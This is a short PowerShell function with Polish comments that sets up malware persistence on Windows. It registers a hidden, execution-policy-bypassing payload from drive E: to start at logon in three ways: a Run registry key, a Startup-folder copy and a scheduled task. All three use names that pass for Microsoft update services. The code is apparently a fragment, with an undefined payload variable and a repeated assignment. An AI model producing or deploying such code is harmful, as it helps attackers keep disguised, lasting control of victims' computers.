function Set-Persistence {
   # Rejestracja autostartu w 3 lokalizacjach
$payloadPath = "E:\$payloadName"

# 1. Rejestr (Current User)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsUpdateService" `
    -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`"" `
    -Force

# 2. Folder Startup
$startupPath = [Environment]::GetFolderPath('Startup')
Copy-Item -Path $payloadPath -Destination "$startupPath\WindowsUpdate.ps1" -Force

# 3. Harmonogram zadań
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $action -Trigger $trigger `
    -TaskName "MicrosoftEdgeUpdate" `
    -Description "Windows Update Service" `
    -User $env:USERNAME `
    -Force

    $payloadPath = "E:\$payloadName"
}
